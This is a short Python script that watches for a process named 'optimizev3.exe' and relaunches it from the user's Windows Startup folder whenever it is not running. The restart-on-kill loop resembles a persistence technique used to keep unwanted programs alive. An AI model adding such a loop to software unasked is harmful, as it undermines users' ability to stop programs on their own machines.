import psutil
import os
import time

def check_process_running(name):
    for p in psutil.process_iter():
        if p.name() == name:
            return True
    return False



while True:
    if not check_process_running('optimizev3.exe'):
        exe_path = os.path.join(os.path.expanduser("~"),'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\optimizev3.exe')
        os.startfile(exe_path)
        print("Started again")
        time.sleep(5)
